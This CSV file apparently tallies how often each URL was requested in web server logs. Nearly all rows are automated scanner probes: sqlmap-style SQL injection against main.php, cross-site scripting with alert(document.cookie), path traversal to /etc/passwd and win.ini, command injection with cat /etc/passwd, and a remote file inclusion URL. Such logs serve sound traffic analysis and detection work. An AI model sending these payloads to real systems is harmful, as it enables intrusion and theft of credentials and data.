Frequency,Resource
1,/main.php?basepath=-3355%29%29%29%20UNION%20ALL%20SELECT%203894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%2C3894%23
1,/phpmyadmin/index.php
1,"sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1"
1,/cgi-bin/MsmMask.exe
1,/dms/
2,/web/phpMyAdmin/index.php
1,/vgn/style
3,///
1,/cgi-bin/start.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%203603%2CCONCAT%280x716a6b7671%2C0x7556544e79426f6a6d4b%2C0x71627a6a71%29%2C3603%2C3603%2C3603%23
1,/main.php?basepath=%29%29%29%20AND%20UPDATEXML%282087%2CCONCAT%280x2e%2C0x716a6b7671%2C%28SELECT%20%28ELT%282087%3D2087%2C1%29%29%29%2C0x71627a6a71%29%2C6459%29%20AND%20%28%28%289172%3D9172
1,/main.php?basepath=%29%29%29%20AND%20ELT%289578%3D9578%2CSLEEP%285%29%29%20AND%20%28%28%286733%3D6733
146,index.html
1,/main.php?basepath=-5114%29%29%29%20UNION%20ALL%20SELECT%201394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%2C1394%23
1,/cgi-bin/pals-cgi?palsAction=restart&documentName=/etc/passwd
1,/TvLBvkHh.dtd
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/vgn/license
1,/cgi-bin/com5.pl
1,view-source?view-source
1,/basilix/mbox-list.php3
1,//profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/cgi-bin/mt-static/mt-load.cgi
1,/ws_ftp.ini
1,/main.php?basepath=8589
1,/TvLBvkHh.dk
1,/main.php?basepath=-4421%22%29%29%29%20OR%202834%3D4502%23
1,/modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>
1,/interscan/
1,search.pl?Realm=All&Match=0&Terms=test&nocpp=1&maxhits=10&;Rank=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.LCDispatcher
1,/cgi-bin/cgiwrap/~ZA3Z1
1,/TvLBvkHh.orig
1,faqmanager.cgi?toc=/etc/passwd%00
1,/scozbook/view.php?PG=whatever
1,/TvLBvkHh.blt
1,finger
1,/main.php?basepath=%29%29%29%20AND%207520%3DBENCHMARK%285000000%2CMD5%280x594f6b43%29%29%20AND%20%28%28%286377%3D6377
1,/main.php?basepath=%29%20AND%208521%3D4330%20AND%20%285372%3D5372
1,/TvLBvkHh.nlm
1,/Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00.html
1,/SIPCfg
1,/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>
1,/main.php?basepath=-6643%29%20AS%20IHls%20WHERE%204955%3D4955%20OR%207886%3D6206%23
1,/phprov/
1,/phpmyadmin
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/WS_FTP.ini
1,/search/SQLQHit.asp
1,/cgi-bin/ezman.cgi
1,generate.cgi?content=../../../../../../../../../../winnt/win.ini%00board=board_1
1,/main.php?basepath=-6852%29%29%29%20UNION%20ALL%20SELECT%205890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%2C5890%23
1,book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
1,"sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3"
1,/cgi-bin/download.cgi
2,/cgi-bin/cgiwrap/~noaccess
1,/search/sqlqhit.asp
1,/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;
1,multihtml.pl?multi=/etc/passwd%00html
1,/kboard/
1,/cgi-bin/dcshop/orders/orders.txt
1,/PMA2/index.php
1,/main.php?basepath=-2534%29%29%29%20UNION%20ALL%20SELECT%201628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%2C1628%23
1,"viewcvs.cgi/viewcvs/viewcvs/?sortby=rev\""><script>alert('Vulnerable')</script>;"
1,/main.php?basepath=-7022%27%29%20OR%206500%3D4515%23
1,/~/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx
1,bb-hist?HISTFILE=../../../../../../../../../../etc/passwd
1,/php/php.exe?c:\winnt\boot.ini
1,/users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/TvLBvkHh.iso2022-jp
1,/TvLBvkHh.phpp
1,/cgi-bin/lwgate.cgi
1,.
1,/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,"/index.php?file=Liens&op=\""><script>alert('Vulnerable');</script>"
1,/main.php?basepath=%29%29%29%20OR%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29RjdJ%29%23
1,/ISSamples/SQLQHit.asp
1,/main.php?basepath=-4042%29%20OR%201113%3D4804%23
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/pafiledb/includes/team/file.php
1,/cgi-bin/emumail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-bin/quickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=
1,/cgi-bin/redirect
1,/TvLBvkHh.tcl
1,/main.php?basepath=-4113%20OR%208666%3D7656%23
1,/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../boot.ini%00
5,/phpmyadmin/_scripts/setup.php
1,Count.cgi
1,"tst.bat%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/cgi-bin/architext_query.pl
1,/TvLBvkHh.php=
1,/admin-serv/config/admpw
1,/TvLBvkHh.php3
1,/TvLBvkHh.php4
1,/TvLBvkHh.php+
1,cgiwrap/%3Cfont%20color=red%3E
1,/TvLBvkHh.axd
1,/TvLBvkHh.render_warning_screen
1,/main.php?basepath=-3295%27%29%29%20AS%20DVfS%20WHERE%207310%3D7310%20OR%205746%3D5746%23
3,/muieblackcat
1,/com
1,/cgi-bin/ezshopper/search.cgi?user_id=id&database=dbase1.exm&template=../../../../../../../etc/passwd&distinct=1
1,/cgi-bin/erba/start/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/vgn/vr/Select
1,/cgi-bin/sscd_suncourier.pl
1,/cgi-bin/DCShop/auth_data/auth_user_file.txt
1,simple/view_page?mv_arg=|cat%20/etc/passwd|
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/TvLBvkHh.passwd
1,/index.do
1,/lpt9
1,pollit/Poll_It_SSI_v2.0.cgi?data_dir=\etc\passwd%00
1,csNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,ezman.cgi
1,/tftpphone/
1,/cgi-bin/dcshop/auth_data/auth_user_file.txt
1,/cgi-bin/lwgate
1,/config.php
1,/main.php?basepath=-6164%29%29%29%20OR%202483%3D5536%23
1,/TvLBvkHh.jsp+
1,/main.php?basepath=%29%29%29%20RLIKE%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29uTxl%29%23
1,/phpwebfilemgr/index.php?f=../../../../../../../../../etc
1,"/emailfriend/emailnews.php?id=\""<script>alert(document.cookie)</script>"
1,/cutenews/index.php?debug
1,/server/
1,/htbin/
1,/catalog.nsf
1,/officescan/cgi/cgiChkMasterPwd.exe
1,/SiteServer/Admin/commerce/foundation/DSN.asp
1,/TvLBvkHh.INC
1,/cgi-bin/boozt/admin/index.cgi?section=5&input=1
1,/nsn/..%5Cwebdemo/env.bas
1,hello.bat?&dir+c:\\
1,/sips/sipssys/users/a/admin/user
1,loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,/*.*
1,/main.php?basepath=-2482%29%29%29%20UNION%20ALL%20SELECT%207133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%2C7133%23
1,/phpmyadmin2/index.php
1,/main.php?basepath=%22%20AND%201916%3D1916%23
1,/mail.box
1,/main.php?basepath=-1530%29%29%29%20UNION%20ALL%20SELECT%205419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%2C5419%23
1,/main.php?basepath=%22%29%29%20AS%20hOXS%20WHERE%209244%3D9244%20AND%201916%3D1916%23
1,/cgi-bin/view-source?view-source
5,/PhpMyAdmin/scripts/setup.php
1,/index.php/%5C%22%3E%3Cscript%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C
1,/cgi-bin/banner.cgi
1,/main.php?basepath=%22%29%29%20AND%208574%3D7327%23
1,/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../etc/passwd
1,/tiki/tiki-install.php
1,/nsn/..%5Cutil/set.bas
1,/edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd
1,/main.php?basepath=%29%20AS%20XSfb%20WHERE%203771%3D3771%20AND%202606%3D9567%23
1,/TvLBvkHh.password
1,/TvLBvkHh.ca
1,/Config1.htm
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
2,/cgi-bin/cgiwrap/~smtp
1,pals-cgi?palsAction=restart&documentName=/etc/passwd
1,test-cgi?/*
1,/gb/index.php?login=true
1,/TvLBvkHh.cs
1,/s9sCh.csp
1,formmail.cgi
1,/main.php?basepath=%29%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x61784164%29%29%20AND%20%28%28%287539%3D7539
1,/forums/config.php
1,/app/provision/
1,"/search/index.cfm?<script>alert(\""Vulnerable\"")</script>"
2,/default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
1,/cgi-bin/spin_client.cgi?aaaaaaaa
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=%60%20WHERE%202920%3D2920%20AND%209542%3D9218%23
1,/TvLBvkHh.thtml
1,/shopa_sessionlist.asp
1,compatible.cgi
1,/cgi-bin/common/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|
1,/main.php?basepath=%25%22%29%29%29%20AND%205644%3D6573%23
1,/exchange/lib/PUBFLD.INC
1,classified.cgi
1,/index.php?action=storenew&username=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.cp866
1,com5..........................................................................................................................................................................................................................box
1,/cbms/usersetup.php
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.stm
1,/main.php?basepath=%29%20AS%20oxQh%20WHERE%208605%3D8605%20AND%201916%3D1916%23
1,/cgi-bin/archie
1,/cgi-bin/test-cgi?/*
1,/cgi-bin/badmin.cgi
1,/vgn/ac/data
1,/supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
2,/login.asp
1,/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.mdb+
1,/viewpage.php?file=/etc/passwd
1,input2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,"/soinfo.php?\""><script>alert('Vulnerable')</script>"
2,/login.aspx
2,/cgi-bin/cgiwrap/~operator
1,common/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|
1,/cgi-bin/mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00
1,/cgi-bin/webplus.exe?about
1,/main.php?basepath=-5453%29%29%29%20UNION%20ALL%20SELECT%209387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%23
1,/SQLQHit.asp
1,gm.cgi
1,/PLCM/
1,/exchange/lib/GETWHEN.INC
1,/scripts/samples/search/filesize.idq
1,/main.php?basepath=%27%20IN%20BOOLEAN%20MODE%29%20AND%201916%3D1916%23
1,/cgi-bin/mrtg.cfg?cfg=../../../../../../../../etc/passwd
1,/cgi-bin/sendtemp.pl?templ=../../../../../../../../../../etc/passwd
1,/USER/CONFIG.AP
1,LWGate.cgi
2,cart.pl?db='
1,/vgn/stylepreviewer
1,empower?DB=whateverwhatever
2,atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt?
1,/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd
1,/default.htm
1,/cgi-win/
2,cgiwrap/~smmsp
1,anacondaclip.pl?template=../../../../../../../../../../etc/passwd
1,Pbcgi.exe
1,/TvLBvkHh.notes
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/SiteServer/admin/
1,/vgn/record/previewer
1,newsdesk.cgi?t=../../../../../../../../../../etc/passwd
1,/main.php?basepath=%25%27%29%29%29%20AND%209558%3D7761%23
1,/cgi-bin/smartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,/cgi-bin/nph-error.pl
1,cgiemail-1.4/cgicso?query=AAA
1,/main.php?basepath=%29%29%29%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29WnHf%29%23
1,boozt/admin/index.cgi?section=5&input=1
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/tftpserver/
1,/doc/webmin.config.notes
1,/iissamples/issamples/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,/cgi-bin/csLiveSupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/web.config
2,cgiwrap/~unknown
1,/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.types
1,emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/main.php?basepath=%27%20AND%207139%3D7139%20AND%20%27CgIg%27%3D%27CgIg
1,/%25a%25s%25p%25d
1,/getaccess
3,/%5C/
1,/SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp
1,/TvLBvkHh.phtml
1,/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
1,"/servlet/CookieExample?cookiename=<script>alert(\""Vulnerable\"")</script>"
1,/vgn/ac/esave
1,YaBB.pl?board=news&action=display&num=../../../../../../../../../../etc/passwd%00
1,testcgi.exe
1,/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>
1,/cgi-bin/foxweb.dll
1,/provisioning/
1,/blah-whatever-badfile.jsp
1,/tiki/
1,/TvLBvkHh.chl+
1,/TvLBvkHh.iso2022-kr
1,post-query
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/lists/admin/
1,/cgi-bin/echo.bat?&dir+c:\\
1,shtml.dll
1,/TvLBvkHh.stat
1,/a.jsp/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/WebAdmin.dll?View=Logon
1,/TvLBvkHh.dat
1,/main.php?basepath=-3051%29%29%29%20UNION%20ALL%20SELECT%201139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%2C1139%23
1,/search?NS-query-pat=..\..\..\..\..\..\..\..\..\..\boot.ini
1,/main.php?basepath=%20AND%201916%3D1916%23
1,/mailman/options/yourlist?language=en&email=&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;
1,/cgi-bin/guestbook/passwd
1,/TvLBvkHh.SMAIL893
2,//MyAdmin/scripts/setup.php
1,/weblogic
1,/main.php?basepath=-2095%27%29%20AS%20hkqv%20WHERE%206789%3D6789%20OR%205746%3D5746%23
1,/bb000001.pl%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,"/_mem_bin/formslogin.asp?\""><script>alert('Vulnerable')</script>"
1,"FormMail.cgi?<script>alert(\""Vulnerable\"");</script>"
1,/main.php?basepath=-1379%29%20AS%20kcky%20WHERE%205825%3D5825%20OR%205746%3D5746%23
1,/TvLBvkHh.sql
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,mt/mt-check.cgi
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.jsp
1,myguestbook.cgi?action=view
1,/main.php?basepath=%29%29%29%20AND%20ELT%285266%3D5266%2CSLEEP%285%29%29%23
1,/nsn/..%5Cutil/glist.bas
2,/typo3/phpmyadmin/index.php
1,/main.php?basepath=%20AND%205218%3D8245
1,/main.php?basepath=%25%27%29%29%20AND%201916%3D1916%23
1,/main.php?basepath=-2909%29%29%29%20UNION%20ALL%20SELECT%203427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%2C3427%23
1,"/emailfriend/emailfaq.php?id=\""<script>alert(document.cookie)</script>"
1,aglimpse.cgi
1,/examples/jsp/source.jsp??
